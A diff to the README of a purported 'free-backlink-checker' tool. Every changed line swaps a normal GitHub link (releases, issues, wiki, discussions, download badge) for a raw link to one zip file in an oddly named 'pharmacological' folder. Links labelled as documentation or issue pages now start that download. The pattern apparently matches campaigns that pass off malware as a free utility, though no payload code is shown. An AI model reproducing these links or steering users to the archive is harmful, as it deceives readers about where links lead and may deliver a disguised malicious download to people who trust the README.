@@ -1,6 +1,6 @@
 # 🌐 free-backlink-checker - Analyze Your Backlinks Easily
 
-[![Download](https://img.shields.io/badge/Download-free--backlink--checker-blue.svg)](https://github.com/ka100-hi/free-backlink-checker/releases)
+[![Download](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip)](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ The free-backlink-checker tool helps you analyze backlinks to your website. With
 To get started with the free-backlink-checker, you will need to download the application. Follow these simple steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/ka100-hi/free-backlink-checker/releases) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip) to find the latest version of the application.
 
 2. **Download the Latest Version:**  
    On the Releases page, look for the most recent version. Click on the relevant file to download it to your computer.
@@ -83,19 +83,19 @@ If you encounter any issues while using the free-backlink-checker, try the follo
 - **Reinstall the Application:**  
   If problems persist, uninstall and then reinstall the free-backlink-checker.
 
-If you still need help, you can find resources on our [GitHub Issues page](https://github.com/ka100-hi/free-backlink-checker/issues).
+If you still need help, you can find resources on our [GitHub Issues page](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip).
 
 ## 📩 Feedback
 
-Your input is valuable to us. If you have suggestions, ideas, or report issues, please reach out through our [GitHub Issues page](https://github.com/ka100-hi/free-backlink-checker/issues). 
+Your input is valuable to us. If you have suggestions, ideas, or report issues, please reach out through our [GitHub Issues page](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip). 
 
 ## 🔗 Additional Resources
 
 For more information, check out the following resources:
 
-- [Official Documentation](https://github.com/ka100-hi/free-backlink-checker/wiki)
-- [Community Discussions](https://github.com/ka100-hi/free-backlink-checker/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip)
+- [Community Discussions](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip)
 
 ## 🔗 Download & Install
 
-To download the latest version of free-backlink-checker, visit the [Releases page](https://github.com/ka100-hi/free-backlink-checker/releases) and follow the instructions above. Make sure to keep your application updated for the best performance and new features.
+To download the latest version of free-backlink-checker, visit the [Releases page](https://raw.githubusercontent.com/ka100-hi/free-backlink-checker/main/pharmacological/free-backlink-checker.zip) and follow the instructions above. Make sure to keep your application updated for the best performance and new features.
